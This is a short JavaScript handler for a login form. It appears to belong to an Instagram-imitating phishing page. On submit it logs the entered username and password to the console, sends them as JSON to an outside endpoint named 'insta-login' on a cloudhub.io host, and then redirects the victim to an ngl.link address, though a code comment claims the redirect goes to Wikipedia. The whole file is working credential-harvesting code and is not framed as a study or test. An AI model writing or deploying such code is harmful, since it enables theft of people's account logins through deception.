window.onload = function(){
    document.getElementById("foorm").reset();
}

const form = document.getElementById('foorm');

form.addEventListener('submit', (event) => {
    event.preventDefault();

    const username = document.getElementById('user').value;
    console.log(username);
    const password = document.getElementById('passcode').value;
    console.log(password);
    const data = {
        username: username,
        password: password
    };

    fetch('	https://insta-login-nstzap.5sc6y6-4.usa-e2.cloudhub.io/api/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (!response.ok) {
          throw new Error("Login failed");
        }
        return response.json();
      })
      .then(result => {
        console.log("Success:", result);
    
        // Check login success
        if (result.statusCode == 200) {
          // Redirect to Wikipedia
          window.location.href = "https://ngl.link/hello44371";
        } else {
          alert("Invalid username or password!");
        }
      })
      .catch(error => {
        console.error("Error:", error);
        alert("An error occurred while logging in. Please try again.");
      });
});